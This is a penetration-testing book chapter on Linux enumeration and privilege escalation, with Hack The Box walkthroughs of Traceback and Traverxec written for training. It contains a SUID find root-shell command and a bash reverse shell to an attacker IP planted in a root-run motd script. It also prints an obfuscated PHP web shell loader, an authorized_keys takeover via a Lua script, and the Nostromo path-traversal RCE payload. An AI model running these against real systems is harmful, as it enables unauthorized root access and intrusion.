# Enumeration and privilege escalation on Linux

> By this stage we have gained initial access to a machine as a user. Having achieved this objective, our goal is to get administrative access to the box. This may not be a direct path from the initial user but it will start with more enumeration to find vulnerabilities that will allow us to either elevate our privileges directly by becoming the administrator or determine a path through obtaining access to other users first.

## Linux User Privileges

A user on a system is granted privileges to perform actions on that system. On Linux, user privileges are expressed as the ability to read from, write to or execute files on the system. These privileges are a property of the file itself rather the actual user. Users belong to groups and file permissions can be limited to specific groups as well.

![](../.gitbook/assets/screen-shot-2021-04-27-at-11.26.41-am.png)

This shows the file permissions for a file file.sh. You can get this listing by doing an ls -l at the shell prompt. The permissions are listed to the left and start with the file type. This will be 'd' for a directory and '-' for a file. This is followed by the read \(r\), write \(w\) and execute \(x\) permissions in 3 sets of 3. The first set of permissions apply to the owner of the file, in this case rin, the second group of permissions apply to the group 'web' and the third set of permissions applies to everyone else or 'all'.

These permissions are set on directories as well. In the case of directories, the execute permission allows a user to enter and list the directory.

There are other permissions that are important as well, the main one being the set user or group id \(SUID or SGID\) permission. The SUID bit means that anyone else who has permission to run the program will run as the effective user id of the owner of the file. We can demonstrate this with the following program:

```c
#include <stdio.h>
#include <unistd.h>
int main ()
{
  printf("Real uid: %d\n", getuid());
  printf("Effective uid: %d\n", geteuid());
}
```

This just prints out the user id and effective user id. If we compile the program, chane the ownership to user root and group root and then run it we get:

```bash
┌─[rin@parrot]─[~/boxes/book]
└──╼ $gcc -o testuid testuid.c
┌─[rin@parrot]─[~/boxes/book]
└──╼ $ls -al
total 28
drwxr-xr-x 1 rin rin 58 Dec 23 11:23 .
drwxrwxrwx 1 rin rin 190 Dec 23 10:37 ..
-rwxr-xr-x 1 rin rin 16712 Dec 23 11:23 testuid
-rw-r--r-- 1 rin rin 147 Dec 23 11:19 testuid.c
┌─[rin@parrot]─[~/boxes/book]
└──╼ $sudo chown root:root testuid
┌─[rin@parrot]─[~/boxes/book]
└──╼ $./testuid
Real uid: 1000
Effective uid: 1000
```

 This prints out the user id of rin which is 1000. if we now set the suid bit with chmod and run again, we get:

```bash
┌─[rin@parrot]─[~/boxes/book]
└──╼ $sudo chmod u+s testuid
┌─[rin@parrot]─[~/boxes/book]
└──╼ $./testuid
Real uid: 1000
Effective uid: 0
```

The effective uid is now 0 which is the user id of root. It is sometimes convenient to use suid or sgid on a binary but it obviously opens up a vulnerability through granting someone unintended privileges through simple oversight. We can search for files with these permissions set with the find command:

```bash
find / -perm -u=s -type f 2>/dev/null
find / -perm -g=s -type f 2>/dev/null
```

The permissions described here are not the only way to control access to files in Linux or other Unix systems. Linux supports Access Control Lists \(ACLs\) on files as well that allow more sophisticated control over who gets access to a file and what they can do with it. We can look at the ACL of a file using getfacl

```bash
┌─[rin@parrot]─[~/boxes/book]
└──╼ $getfacl testuid
# file: testuid
# owner: root
# group: root
# flags: s--
user::rwx
group::r-x
other::r-x
```

By default, the ACL will be set to the permissions on the file. We can set additional access controls using setfacl. When this is used, the file listing will have the + flag set on it. Let us take a file file.txt that is created by root and has the contents "Hello World" in it. When user rin tries to read the file, she will get permission denied:

```bash
┌─[rin@parrot]─[~/boxes/book]
└──╼ $ls -al
total 32
drwxr-xr-x 1 rin rin 62 Dec 23 12:23 .
drwxrwxrwx 1 rin rin 190 Dec 23 10:37 ..
-rw-r----- 1 root root 13 Dec 23 12:24 file.txt
┌─[✗]─[rin@parrot]─[~/boxes/book]
└──╼ $cat file.txt
cat: file.txt: Permission denied
```

If we now set an ACL to allow rin to read the file, list the file and then cat again we get:

```bash
┌─[✗]─[rin@parrot]─[~/boxes/book]
└──╼ $sudo setfacl -m u:rin:r file.txt
┌─[rin@parrot]─[~/boxes/book]
└──╼ $ls -al
total 32
drwxr-xr-x 1 rin rin 62 Dec 23 12:23 .
drwxrwxrwx 1 rin rin 190 Dec 23 10:37 ..
-rw-r-----+ 1 root root 13 Dec 23 12:24 file.txt
┌─[rin@parrot]─[~/boxes/book]
└──╼ $cat file.txt
Hello World
```

Note the + on the permissions after setting the ACL. rin can now read the file. If we list the ACL of the file, we can see that the user rin has been granted access to file.txt in addition to the owner root.

```bash
┌─[rin@parrot]─[~/boxes/book]
└──╼ $getfacl file.txt
# file: file.txt
# owner: root
# group: root
user::rw-
user:rin:r--
group::r--
mask::r--
other::---
```

We have seen an example of the use of suid files in the Hack The Box machine Ellingson \(REF XXX\) where a buffer overflow of an application, owned by root and with the suid permission set allowed us to run a shell as root. Having a file with suid set and owned by a more privileged user is only part of the equation. We also need to find a way for that running that program will allow us to perform an action such as run a local or reverse shell or read or write to a file. Fortunately, there are a large number of Linux applications that will allow us to do exactly that. A list of them is available on GTFOBins \(https://gtfobins.github.io/\#+suid\). As an example, we can take the application find. Here we are going to create a local copy of the find command and set the suid bit on it and then execute to drop to a shell as root.

```bash
┌─[rin@parrot]─[~/boxes/book/test]
└──╼ $sudo install -m =xs $(which find) .
[sudo] password for rin:
┌─[rin@parrot]─[~/boxes/book/test]
└──╼ $./find . -exec /bin/sh -p \; -quit
# whoami
root
# id
uid=1000(rin) gid=1000(rin) euid=0(root) egid=0(root) groups=0(root),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),118(debian-tor),124(bluetooth),140(scanner),1000(rin)
#
```

This type of exploit is called living of the land \(LoTL\) as we are exploiting tools and applications that are already on the system and not having to install bespoke software that might get picked up by AV software or other software monitoring for unusual activity.

## Linux Enumeration

One of the easiest things to do to enumerate a system after gaining access is to run a script file like PEAS \(Privilege Escalation Awesome Scripts\) \(https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite\). This checks for an extensive, but not necessarily exhaustive, list of potential vulnerabilities. It produces a great deal of output that is colour coded and references explanations of its findings on the GitHub site HackTricks \(https://book.hacktricks.xyz/linux-unix/privilege-escalation\#path\).

Going through each of the specific things that LinPEAS checks will be too extensive and so we will not go through each step but focus on the main general areas that could be done manually as well. The basic principles however is to run through an enumeration process that is looking for vulnerabilities, including misconfigurations that are exploitable and any information that we can use for both further access and exploitation or simply information that is of value from the target.

The enumeration will aim to understand the system that you have access to in detail including, the physical characteristics, network, software that is running on it, including system software. As with remote access, we are looking for vulnerabilities related to software versions that we can exploit because we have local access. The same rules apply as before, depending on whether we actually have the user's password and are able to exploit authenticated vulnerabilities as well as unauthenticated ones. Whilst doing this, we are going to pay specific attention to potential misconfigurations that can be exploited such as execution paths that allow scripts and binaries to be run as part of the normal processing on the system. User privileges that allow execution of administrative commands such as sudo, installing or running services, etc

At the same time, we are searching for information that might be accessible and useful, including but not limited to, usernames and passwords. This might be in documents, configuration files and databases.

Looking for information

The file layout of a Linux \(or \*nix\) machine is usually of the format

```text
/bin -> usr/bin
/boot
/dev
/etc
/home
/lib -> usr/lib
/media
/mnt
/opt
/proc
/root
/run
/sandbox
/sbin -> usr/sbin
/srv
/sys
/tmp
/usr
/var
```

In more detail:

 / is the root directory and only the user root has access to write in this directory. The user root's home directory is /root.

/bin contains user binary executables like ps, ls, ping, grep etc. it is a symbolic link to /usr/bin

/sbin contains system binaries like iptables, reboot, fdisk, ifconfig, etc.

/etc contains configuration files and scripts for services running on the system. Configuration files for the Apache 2 web server are in /etc/apache2 for example. Also contains the passwd and shadow files that contain user and password information.

/dev contains device files that are the interface with physical devices on, or attached to, the system such as tty devices /dev/tty1. /dev/shm is a directory that is commonly used as a way of passing information between applications through shared memory. This is a virtual directory and anything written to it is stored in memory and not actually written to disk. Consequently, even though /tmp and /dev/shm get wiped on reboot of the machine, files in /tmp could potentially be restored forensically even after being wiped.

/proc contains files that store information about system processes like uptime for example.

/var contains files like logs \(/var/logs\), backups \(/var/backups\), mail \(/var/mail\) and spool \(printing; /var/spool\). There is also a /var/tmp directory that can be used to run programs out of. This directory does survive reboots however. The directory /var/www/html is often used as the root directory of the web server.

/tmp contains temporary files as mentioned previously. Files get deleted on reboot.

/usr contains user binaries, libraries, documentation and source code

/usr/local contains users programs that you install from source.

/home contains user home directories

/boot contains boot loader files

/lib contains system libraries

/opt contains optional add-on applications

/mnt is a location for mounting temporary filesystems

/media is a location for mounting removable media devices like CDs

/srv contains specific service related data

## Enumerating the file system

When enumerating the file system, the /home directory is a good place to start, especially if you have access to any of the users on the system.

Home directories on Linux usually contain a number of files and directories that are hidden because they start with a ".". To list them, you need to use the ls -la flag. Some of these files are resource script files like .bashrc \(if you are running bash\) that configure the bash environment. Things like configuring the amount of history that is kept which is normally viewable by typing history or by listing the .bash\_history file. Other programs such as browsers and email clients keep hidden directories and files in the user's home directory and so these are a good place to look for potentially sensitive information.

Other locations that can be checked are:

&lt;span style="color:blue"&gt;/var/backups&lt;/span&gt; which is a potential location for backups of sensitive files that may be accessible.

/var/log is normally only accessible by root but if your user is part of the adm group, it may be able to read some of the system log files and log files belonging to web and database servers.

/etc for configuration information for web servers and databases. The /etc/passwd file is readable by all users and will reveal information about the users on the system, which ones can login and where their home directories are located.

/opt can contain additional software that has been installed by a user and so is a good place to look for things that are non-standard on the system.

/usr/local is another location of applications and libraries that have been installed from source.

/bin, /sbin, /usr/local/bin - we have already seen that searching for binaries that have the suid of guid bit set is often an easy exploitable vulnerability and that we can search for these generally on the system or specifically in these directories.

Another way of exploring what applications have been installed on a system is through the specific package manager tool for the Linux distribution of the machine. One of the most common tools for this is APT but there are a raft of others lime RPM or YUM for RedHat systems. Using apt, you can investigate what packages have been installed on the system with the command

apt --list

If we want to see what files a package has installed, we can use dpkg-query as follows:

┌─\[rin@parrot\]─\[~\]

└──╼ $dpkg-query -L vim-common

/.

/etc

/etc/vim

/etc/vim/vimrc

/usr

/usr/bin

/usr/bin/helpztags

/usr/lib

/usr/lib/mime

/usr/lib/mime/packages

/usr/lib/mime/packages/vim-common

…

We can also find out what package a specific file was installed from using the dpkg command:

┌─\[rin@parrot\]─\[~\]

└──╼ $dpkg -S /usr/bin/nvim

neovim: /usr/bin/nvim

Enumerating processes

As a starting point, we can list the running processes on a machine using the ps command:

echo "$\(ps aux\)"

Which will produce output of the type

root 738 0.7 4.7 868380 285788 tty7 Ssl+ 2020 20:09 /usr/lib/xorg/Xorg :0 -seat seat0 -auth /var/run/lightdm/root/:0 -nolisten tc

p vt7 -novtswitch

root 739 0.0 0.0 2672 1616 tty1 Ss+ 2020 0:00 /sbin/agetty -o -p -- \u --noclear tty1 linux

redis 744 0.5 0.8 199724 50820 ? Ssl 2020 14:21 /usr/bin/redis-server 127.0.0.1:0

postgres 769 0.0 0.4 212832 24896 ? Ss 2020 0:24 /usr/lib/postgresql/13/bin/postgres -D /var/lib/postgresql/13/main -c config\_

file=/etc/postgresql/13/main/postgresql.conf

postgres 770 0.0 0.4 211568 25044 ? Ss 2020 0:09 /usr/lib/postgresql/12/bin/postgres -D /var/lib/postgresql/12/main -c config\_

file=/etc/postgresql/12/main/postgresql.conf

postgres 793 0.0 0.1 212936 6120 ? Ss 2020 0:00 postgres: 13/main: checkpointer

We are looking for any unusual programs running and who they are being run by. This gives us a static view of the processes however and doesn't necessarily show processes that are run periodically and then terminate after a short period. To look at this sort of behaviour, we can use a program called pspy64 \(https://github.com/DominicBreuker/pspy\) which will monitor processes and highlight when new processes run.

Services are usually long running processes, often run by specific accounts or root that provide functionality such as communication, transportation, databases, web servers, etc. You can list the services running on.a machine using

service --status-all

For each individual service, you can get additional information using the systemctl application and then specific client applications that may communicate with the service.

┌─\[✗\]─\[rin@parrot\]─\[~\]

└──╼ $systemctl status ufw

● ufw.service - Uncomplicated firewall

 Loaded: loaded \(/lib/systemd/system/ufw.service; enabled; vendor preset: enabled\)

 Active: active \(exited\) since Tue 2020-12-15 10:27:41 AWST; 2 weeks 3 days ago

 Docs: man:ufw\(8\)

 Main PID: 370 \(code=exited, status=0/SUCCESS\)

 Tasks: 0 \(limit: 7009\)

 Memory: 0B

 CGroup: /system.slice/ufw.service

Cron is a job scheduler that runs a process periodically. It is configured using a client application crontab but you may have access to list cron jobs that are configured in a number of different locations:

/etc/crontab.hourly

/etc/crontab.daily

/etc/crontab.weekly

/etc/crontab.d

and in the file /etc/crontab. You can also list cron jobs for the current user using

crontab -l

LinPEAS will do all of the above and we will cover a few specific examples of enumeration using LinPEAS. It is important to remember however that this doesn't substitute for manual enumeration. LinPEAS, even in its "Stealth" mode will be very noisy because it will likely flag unusual behavior for the user for any anomalous behavior detection software.

Hack The Box Case Study Traceback

An nmap scan of the box reveals ports 80 and 22 are open.

PORT STATE SERVICE VERSION

22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 \(Ubuntu Linux; protocol 2.0\)

\| ssh-hostkey:

\| 2048 96:25:51:8e:6c:83:07:48:ce:11:4b:1f:e5:6d:8a:28 \(RSA\)

\| 256 54:bd:46:71:14:bd:b2:42:a1:b6:b0:2d:94:14:3b:0d \(ECDSA\)

\|\_ 256 4d:c3:f8:52:b8:85:ec:9c:3e:4d:57:2c:4a:82:fd:86 \(ED25519\)

80/tcp open http Apache httpd 2.4.29 \(\(Ubuntu\)\)

\| http-methods:

\|\_ Supported Methods: POST OPTIONS HEAD GET

\|\_http-server-header: Apache/2.4.29 \(Ubuntu\)

\|\_http-title: Help us

Service Info: OS: Linux; CPE: cpe:/o:linux:linux\_kernel

Going to the website at the IP address, we get a page saying that the site has been "owned" by a hacker and that a backdoor has been installed \(Figure 6-2\).

![](../.gitbook/assets/0%20%286%29.png)

Traceback home page

The source code of the page has a comment:

&lt;!--Some of the best web shells that you might need ;\)--&gt;

If we do an Internet search with this line, we get a Github site of Web-Shells in ASP, JSP and PHP \(https://github.com/TheBinitGhimire/Web-Shells\). We know from nmap that the machine is running Ubuntu and so is not going to be running ASP which is a Microsoft technology. We would also assume that if the site was running JSP, we might have picked up Tomcat when doing the nmap but it is running Apache. So we will assume that it is running PHP for the time being. We can run a gobuster directory scan and use a special wordlist from SecLists that has common backdoor shell names in it:

┌─\[oztechmuse@parrot\]─\[~/boxes/Traceback\]

└──╼ $gobuster dir -t 50 -w /usr/share/SecLists/Discovery/Web-Content/CommonBackdoors-PHP.fuzz.txt -u http://traceback.htb

…

/smevk.php \(Status: 200\)

This gives us a file smevk.php which is indeed one of the web shells from the GitHub site. When we go to that file on the site, we get a login asking for a username and password as shown in Figure 6-3.

![Graphical user interface

Description automatically generated](../.gitbook/assets/1%20%282%29.png)

smevk.php login page.

Looking at the code, of this shell, we see that there is a username and password "admin" and "admin":

&lt;?php

/\*

SmEvK\_PaThAn Shell v3 Coded by Kashif Khan .

https://www.facebook.com/smevkpathan

smevkpathan@gmail.com

Edit Shell according to your choice.

Domain read bypass.

Enjoy!

\*/

//Make your setting here.

$deface\_url = 'http://pastebin.com/raw.php?i=FHfxsFGT'; //deface url here\(pastebin\).

$UserName = "admin"; //Your UserName here.

$auth\_pass = "admin"; //Your Password.

//Change Shell Theme here//

$color = "\#8B008B"; //Fonts color modify here.

$Theme = '\#8B008B'; //Change border-color accoriding to your choice.

$TabsColor = '\#0E5061'; //Change tabs color here.

\#-------------------------------------------------------------------------------

?&gt;

&lt;?php

$smevk ="...";

eval\("?&gt;".\(base64\_decode\($smevk\)\)\);

?&gt;

![](../.gitbook/assets/2%20%284%29.png)

smevk.php home page after logging in.

After logging in, we are presented with information that the shell has gathered that includes the username and group that we are executing as, the name of the machine and its operating system information, and a listing of the directory of /var/www/html which is the root web directory. Unfortunately, the poor choice of colors makes the page difficult to read and so we should try and get a reverse shell to be able to explore more efficiently. We can do that by executing a bash reverse shell in the Execute section of the web shell as shown in Figure 6-5.

![A picture containing text

Description automatically generated](../.gitbook/assets/3%20%283%29.png)

Starting a netcat listener on port 6001, we get a hit when the script is executed and we can then upgrade the shell

webadmin@traceback:/var/www/html$ python3 -c 'import pty;pty.spawn\("/bin/bash"\);'

&lt;ml$ python3 -c 'import pty;pty.spawn\("/bin/bash"\);'

webadmin@traceback:/var/www/html$ ^Z

\[1\]+ Stopped nc -lvnp 6001

┌─\[✗\]─\[rin@parrot\]─\[~/boxes/Traceback\]

└──╼ $stty raw -echo

┌─\[rin@parrot\]─\[~/boxes/Traceback\]

nc -lvnp 6001

webadmin@traceback:/var/www/html$

Now that we are on the box, we can start with some simple enumeration. The first thing is to check what users are on the box by looking at the passwd file:

webadmin@traceback:/var/www/html$ cat /etc/passwd

root:x:0:0:root:/root:/bin/bash

…

webadmin:x:1000:1000:traceback,,,:/home/webadmin:/bin/bash

sshd:x:106:65534::/run/sshd:/usr/sbin/nologin

sysadmin:x:1001:1001::/home/sysadmin:/bin/sh

From this file, we can see that there are three users that have home directories and can login; root, webadmin and sysadmin. Users that are not expected to login do not have a home directory configured and instead of a shell, will have the /usr/sbin/nologin program that will log the attempted login and print a message saying the "This account is currently not available". Exploring their home directories, we only have access to /home/webadmin, since that is who we are, and in that directory, we find a file note.txt with the contents:

webadmin@traceback:/home/webadmin$ cat note.txt

- sysadmin -

I have left a tool to practice Lua.

I'm sure you know where to find it.

Contact me if you have any question.

webadmin@traceback:/home/webadmin$

Looking at webadmin's home directory in more detail, we find that the .bash\_history file has some content. Looking at that file, we get:

webadmin@traceback:/home/webadmin$ ls -al

total 44

drwxr-x--- 5 webadmin sysadmin 4096 Mar 16 2020 .

drwxr-xr-x 4 root root 4096 Aug 25 2019 ..

-rw------- 1 webadmin webadmin 105 Mar 16 2020 .bash\_history

-rw-r--r-- 1 webadmin webadmin 220 Aug 23 2019 .bash\_logout

-rw-r--r-- 1 webadmin webadmin 3771 Aug 23 2019 .bashrc

drwx------ 2 webadmin webadmin 4096 Aug 23 2019 .cache

drwxrwxr-x 3 webadmin webadmin 4096 Aug 24 2019 .local

-rw-rw-r-- 1 webadmin webadmin 1 Aug 25 2019 .luvit\_history

-rw-r--r-- 1 webadmin webadmin 807 Aug 23 2019 .profile

drwxrwxr-x 2 webadmin webadmin 4096 Feb 27 2020 .ssh

-rw-rw-r-- 1 sysadmin sysadmin 122 Mar 16 2020 note.txt

webadmin@traceback:/home/webadmin$ cat .bash\_history

ls -la

sudo -l

nano privesc.lua

sudo -u sysadmin /home/sysadmin/luvit privesc.lua

rm privesc.lua

logout

So this looks like webadmin can run a program /home/sysadmin/luvit as the user sysadmin using sudo and pass it a Lua script.

Let us run LinPEAS and see what it finds. To get linpeas.sh we can run a python3 web server from our machine and then use wget from Traceback. Copy linpeas.sh into a directory and then run:

python3 -m http.server 8000

On Traceback, we can fetch linpeas.sh into a temporary directory /dev/shm. The benefit of using this directory rather than /tmp is that when the machine gets rebooted, the /dev/shm will be cleared, cleaning up any files we might have forgotten. Once downloaded, we change the permissions to execute and then run, putting the output into a file:

webadmin@traceback:/dev/shm$ wget http://10.10.14.117:8000/linpeas.sh

--2020-12-27 20:31:05-- http://10.10.14.117:8000/linpeas.sh

Connecting to 10.10.14.117:8000... connected.

HTTP request sent, awaiting response... 200 OK

Length: 299897 \(293K\) \[text/x-sh\]

Saving to: 'linpeas.sh'

linpeas.sh 100%\[===================&gt;\] 292.87K 237KB/s in 1.2s

2020-12-27 20:31:07 \(237 KB/s\) - 'linpeas.sh' saved \[299897/299897\]

webadmin@traceback:/dev/shm$ chmod a+x linpeas.sh

webadmin@traceback:/dev/shm$ ./linpeas.sh -s &gt; linpeas.out

Going through the output, the first we find is further evidence that webadmin can run sudo as indicated by the bash history we found earlier. In the LinPEAS output, we see that the output from sudo -l which lists that webadmin has the ability to run the program luvit in /home/sysadmin/luvit/ as user sysadmin:

\[+\] Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d

\[i\] https://book.hacktricks.xyz/linux-unix/privilege-escalation\#sudo-and-suid

Matching Defaults entries for webadmin on traceback:

 env\_reset, mail\_badpass, secure\_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User webadmin may run the following commands on traceback:

 \(sysadmin\) NOPASSWD: /home/sysadmin/luvit

Right now, we could continue our enumeration but we seem to have a path to getting access to the sysadmin user and we are going to explore that first. Based on the note, we think that the luvit program will execute Lua script. Lua is the scripting language that nmap uses for any external functionality that it can run. We can use the program running as sysadmin to write an SSH key to the authorized\_keys file in the home directory of sysadmin. The first thing to do is to generate an SSH key using ssh-keygen:

┌─\[rin@parrot\]─\[~/boxes/Traceback\] \[34/40\]

└──╼ $ssh-keygen -f sysadmin.key

Generating public/private rsa key pair.

Enter passphrase \(empty for no passphrase\):

Enter same passphrase again:

Your identification has been saved in sysadmin.key

Your public key has been saved in sysadmin.key.pub

The key fingerprint is:

SHA256:Nc30lm7tE6QDKmKMUuVSwK1FKJXeLlA0jZ8lUdFCfnk rin@parrot

…

Looking at the documentation for Lua script, writing to a file is fairly simple and we can adapt the code to append the public key to the authorized\_keys file:

file = io.open\("/home/sysadmin/.ssh/authorized\_keys","a"\)

io.output\(file\)

io.write\("ssh-rsa … ="\)

We can then run this script:

webadmin@traceback:/dev/shm$ sudo -u sysadmin /home/sysadmin/luvit test.lua

And then SSH onto the machine as sysadmin:

┌─\[oztechmuse@parrot\]─\[~/boxes/Traceback\]

└──╼ $ssh -i sysadmin sysadmin@traceback.htb

The authenticity of host 'traceback.htb \(10.129.1.189\)' can't be established.

ECDSA key fingerprint is SHA256:7PFVHQKwaybxzyT2EcuSpJvyQcAASWY9E/TlxoqxInU.

Are you sure you want to continue connecting \(yes/no/\[fingerprint\]\)? yes

Warning: Permanently added 'traceback.htb,10.129.1.189' \(ECDSA\) to the list of known hosts.

\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#

-------- OWNED BY XH4H ---------

- I guess stuff could have been configured better ^^ -

\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#

Welcome to Xh4H land

Last login: Mon Mar 16 03:50:24 2020 from 10.10.14.2

$ whoami

sysadmin

Now that we are sysadmin and have got the flag in /home/sysadmin/user.txt, we can run LinPEAS again as the sysadmin user. This will generate different output because as sysadmin, we will have different privileges than webadmin. You can see this when looking at the output and the sudo -l command returns nothing whereas it did when we were webadmin. Running linpeas.sh again and looking through the output, we get a highly exploitable vulnerability flagged:

\[+\] Interesting GROUP writable files \(not in Home\) \(max 500\)

\[i\] https://book.hacktricks.xyz/linux-unix/privilege-escalation\#w

ritable-files

 Group sysadmin:

/etc/update-motd.d/50-motd-news

/etc/update-motd.d/10-help-text

/etc/update-motd.d/91-release-upgrade

/etc/update-motd.d/00-header

/etc/update-motd.d/80-esm

/home/webadmin/note.txt

Before we investigate this more, let us use another tool to enumerate processes called pspy64 \(https://github.com/DominicBreuker/pspy\). This will monitor processes and highlight when new processes run. When running it on Traceback, we see that every minute a set of processes run:

2020/12/28 17:11:01 CMD: UID=0 PID=49845 \| sleep 30

2020/12/28 17:11:01 CMD: UID=0 PID=49844 \| /bin/cp /var/backups/.update-motd.d/00-header /var/backups/.update-motd.d/10-help-text /var/backups/.update-motd.d/50-motd-news /var/backups/.update-motd.d/80-esm /var/backups/.update-motd.d/91-release-upgrade /etc/update-motd.d/

2020/12/28 17:11:01 CMD: UID=0 PID=49843 \| /bin/sh -c /bin/cp /var/backups/.update-motd.d/\* /etc/update-motd.d/

2020/12/28 17:11:01 CMD: UID=0 PID=49842 \| /bin/sh -c sleep 30 ; /bin/cp /var/backups/.update-motd.d/\* /etc/update-motd.d/

2020/12/28 17:11:01 CMD: UID=0 PID=49841 \| /usr/sbin/CRON -f

2020/12/28 17:11:01 CMD: UID=0 PID=49840 \| /usr/sbin/CRON -f

2020/12/28 17:11:31 CMD: UID=0 PID=49846 \| /bin/cp /var/backups/.update-motd.d/00-header /var/backups/.update-motd.d/10-help-text /var/backups/.update-motd.d/50-motd-news /var/backups/.update-motd.d/80-esm /var/backups/.update-motd.d/91-release-upgrade /etc/update-motd.d/

Motd is "message of the day" and is a set of text files that are displayed to a user when they log in. Linux uses PAM \(Pluggable Authentication Modules\) to manage the authentication and login process. The module pam\_motd is the one responsible for displaying the messages to users logging in and before they get a shell.

We can see what happens to the pspy output when we SSH in:

2020/12/28 17:41:04 CMD: UID=0 PID=50208 \| /usr/sbin/sshd -D -R

2020/12/28 17:41:04 CMD: UID=106 PID=50209 \| sshd: \[net\]

2020/12/28 17:41:07 CMD: UID=0 PID=50211 \| run-parts --lsbsysinit /etc/update-motd.d

2020/12/28 17:41:07 CMD: UID=0 PID=50210 \| sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d &gt; /run/motd.dynamic.new

2020/12/28 17:41:07 CMD: UID=??? PID=50213 \| ???

2020/12/28 17:41:07 CMD: UID=0 PID=50214 \| /bin/sh /etc/update-motd.d/50-motd-news

2020/12/28 17:41:07 CMD: UID=0 PID=50218 \| /bin/sh /etc/update-motd.d/50-motd-news

2020/12/28 17:41:07 CMD: UID=0 PID=50217 \|

2020/12/28 17:41:07 CMD: UID=0 PID=50216 \|

2020/12/28 17:41:07 CMD: UID=0 PID=50215 \|

2020/12/28 17:41:07 CMD: UID=0 PID=50219 \| /bin/sh /etc/update-motd.d/80-esm

2020/12/28 17:41:07 CMD: UID=0 PID=50220 \| /bin/sh /etc/update-motd.d/80-esm

2020/12/28 17:41:07 CMD: UID=0 PID=50221 \| /usr/bin/python3 -Es /usr/bin/lsb\_release -ds

2020/12/28 17:41:07 CMD: UID=0 PID=50222 \| /bin/sh /etc/update-motd.d/91-release-upgrade

2020/12/28 17:41:07 CMD: UID=0 PID=50225 \| cut -d -f4

2020/12/28 17:41:07 CMD: UID=0 PID=50224 \| /usr/bin/python3 -Es /usr/bin/lsb\_release -sd

2020/12/28 17:41:07 CMD: UID=0 PID=50223 \| /bin/sh /etc/update-motd.d/91-release-upgrade

2020/12/28 17:41:07 CMD: UID=??? PID=50226 \| ???

2020/12/28 17:41:07 CMD: UID=0 PID=50227 \| stat -c %Y /var/lib/ubuntu-release-upgrader/release-upgrade-available

2020/12/28 17:41:07 CMD: UID=0 PID=50230 \| sshd: sysadmin \[priv\]

2020/12/28 17:41:08 CMD: UID=1001 PID=50231 \| -sh

The most important thing hers is that we can see the scripts in the motd files being run by root. We should be able to modify one of the files and put in a reverse shell which will get called when we SSH in.

We can edit the file /etc/update-motd.d/00-header and add the line:

bash -c "bash -i &gt;& /dev/tcp/10.10.14.117/6002 0&gt;&1"

We start a netcat listener on our box listening on port 6002, write the motd file and then ssh as sysadmin. You will know that the process has worked because the SSH login will hang when it executes the reverse shell. Our listener should then drop into a shell as root:

┌─\[rin@parrot\]─\[~/boxes/Traceback\]

└──╼ $nc -lvnp 6002

listening on \[any\] 6002 ...

connect to \[10.10.14.117\] from \(UNKNOWN\) \[10.129.1.189\] 59966

bash: cannot set terminal process group \(50728\): Inappropriate ioctl for device

bash: no job control in this shell

root@traceback:/\# whoami

whoami

root

In the enumeration process, we went through the steps of looking for information and then looking for vulnerabilities that we could exploit on the system, in this case a misconfiguration left by the "hackers" who had taken over the machine. LinPEAS made that process more efficient, highlighting the vulnerability of the group writeable motd files.

We will look at another example where using LinPEAS highlights potential credentials in a configuration file to get a user with different privileges. Having got this user, we can do some manual enumeration to find a path to escalate privileges to get root.

Hack The Box Case Study Traverxec

An nmap scan shows that ports 22 and 80 are open:

22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u1 \(protocol 2.0\)

…

80/tcp open http nostromo 1.9.6

\|\_http-favicon: Unknown favicon MD5: FED84E16B6CCFE88EE7FFAAE5DFEFD34

\| http-methods:

\|\_ Supported Methods: GET HEAD POST

\|\_http-server-header: nostromo 1.9.6

\|\_http-title: TRAVERXEC

Service Info: OS: Linux; CPE: cpe:/o:linux:linux\_kernel

The web server is Nostromo version 1.9.6. Looking at the exploit database we find a number of potential vulnerabilities with this version. Before looking at the exploits however, we should look at the website itself.

Going to the home page, we find a site of David White who is a web designer \(Figure 6-5\).

![Diagram, website

Description automatically generated](../.gitbook/assets/4%20%283%29.png)

Home page of Traverexec.

Looking at the web page, there is little functionality enabled and so we can go back to the vulnerabilities of the webserver Nostromo. If we do a searchsploit of nostromo, we find the following:

┌─\[rin@parrot\]─\[~/boxes/Traverexec\]

└──╼ $searchsploit nostromo

Exploit Title Path

Nostromo - Directory Traversal Remote Command Execution \(Metasploit\) \| multiple/remote/47573.rb

nostromo 1.9.6 - Remote Code Execution \| multiple/remote/47837.py

nostromo nhttpd 1.9.3 - Directory Traversal Remote Command Execution \| linux/remote/35466.sh

The vulnerability is CVE-2019-16278 and is an unauthenticated remote code execution exploit due to the website allowing path traversal. If we look at the Python code by making a local copy of the file:

┌─\[oztechmuse@parrot\]─\[~/boxes/Traverexec\]

└──╼ $searchsploit -m multiple/remote/47837.py

 Exploit: nostromo 1.9.6 - Remote Code Execution

 URL: https://www.exploit-db.com/exploits/47837

 Path: /usr/share/exploitdb/exploits/multiple/remote/47837.py

File Type: Python script, ASCII text executable, with CRLF line terminators

Copied to: /home/oztechmuse/boxes/Traverexec/47837.py

The key part of the code that runs the exploit is the method cve:

def cve\(target, port, cmd\):

 soc = socket.socket\(\)

 soc.connect\(\(target, int\(port\)\)\)

 payload = 'POST /.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.0\r\nContent-Length: 1\r\n\r\necho\necho\n{} 2&gt;&1'.format\(cmd\)

 soc.send\(payload\)

 receive = connect\(soc\)

 print\(receive\)

In this method, the script is doing an HTTP POST to a path that is "/.%0d./.%0d./.%0d./.%0d./bin/sh". The Nostromo code checks for paths in the URL but because of the addition of the carriage return character %0d, it does not think that this is a path. The %0d is removed by a later function making the path "/../../../../bin/sh" and this is then executed with the body of the POST as the argument.

